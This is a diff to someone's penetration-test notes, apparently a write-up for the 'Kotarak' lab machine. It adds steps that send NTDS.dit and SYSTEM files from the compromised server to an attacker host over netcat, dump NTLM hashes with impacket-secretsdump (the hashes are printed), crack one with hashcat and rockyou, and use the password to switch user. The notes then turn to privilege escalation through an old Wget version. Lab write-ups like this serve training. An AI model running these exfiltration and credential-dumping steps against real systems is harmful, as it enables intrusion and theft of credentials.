@@ -3,6 +3,11 @@
 #Localhost Backup Discovery via BURPSUITE REPEATER
 #War File Reverse Shell via Manager Apache Console
 #ntdis pentest results
+#upload the files from the COMPROMISED SERVER to KALI via NC
+#Up0load .NTDS and .bin files
+#Use of impacket-secretdump to dump the HASHES
+#NTLM Hash Crach hashcat hashes rockyou.txt -m 1000
+
 #
 
 1-Enumeration:
@@ -158,7 +163,61 @@
             20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
 
 
+        To upload the .bin and .dit files from the COMPROMISED SERVER to KALI:
+            Kali for .bin:
+                ╼ [★]$ nc -lvnp PORT > SYSTEM
+            COMPROMISED SERVER:
+                tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.89 8000 < 20170721114637_default_192.168.110.133_psexec.ntdsgrab._089134.bin
 
+
+            Kali for .ntds:
+                └──╼ [★]$ nc -lvnp 8000 > ntds.dit
+            COMPROMISED SERVER:
+                tomcat@kotarak-dmz:/home/tomcat/to_archive/pentest_data$ nc 10.10.14.89 8000 < 20170721114636_default_192.168.110.133_psexec.ntdsgrab._333512.dit
+
+
+        Use impacket-secretdump to dump the HASHES:
+            └──╼ [★]$ impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
+                Administrator:500:aad3b435b51404eeaad3b435b51404ee:e64fe0f24ba2489c05e64354d74ebd11:::
+                krbtgt:502:aad3b435b51404eeaad3b435b51404ee:ca1ccefcb525db49828fbb9d68298eee:::
+                atanas:1108:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
+
+            ──╼ [★]$ sudo nano hashes
+                    WE add the Hashes
+
+
+        We Crack the Hash with hashcat:
+            ──╼ [★]$ hashcat hashes rockyou.txt -m 1000
+
+            e64fe0f24ba2489c05e64354d74ebd11:f16tomcat! 
+
+        
+        We esclalate the privileges:
+            tomcat@kotarak-dmz:/home$ ls
+                ls
+                atanas	tomcat
+            tomcat@kotarak-dmz:/home$ su atanas 
+                su atanas
+                Password: f16tomcat!
+
+            atanas@kotarak-dmz:/home$
+
+        We Enumerate via LinEnum.sh:
+            NAME="Ubuntu"
+            VERSION="16.04.1 LTS (Xenial Xerus)"
+
+
+    
+2-Exploit / Priv Esc to Root:
+    We go to the root folders:
+        atanas@kotarak-dmz:/root$ cat app.log
+            cat app.log
+            10.0.3.133 - - [20/Jul/2017:22:48:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+            10.0.3.133 - - [20/Jul/2017:22:50:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+            10.0.3.133 - - [20/Jul/2017:22:52:01 -0400] "GET /archive.tar.gz HTTP/1.1" 404 503 "-" "Wget/1.16 (linux-gnu)"
+
+    Here we fin a depreciated version of "Wget" that is runing every 2 minutes.
+            Wget/1.16 
 
 
 
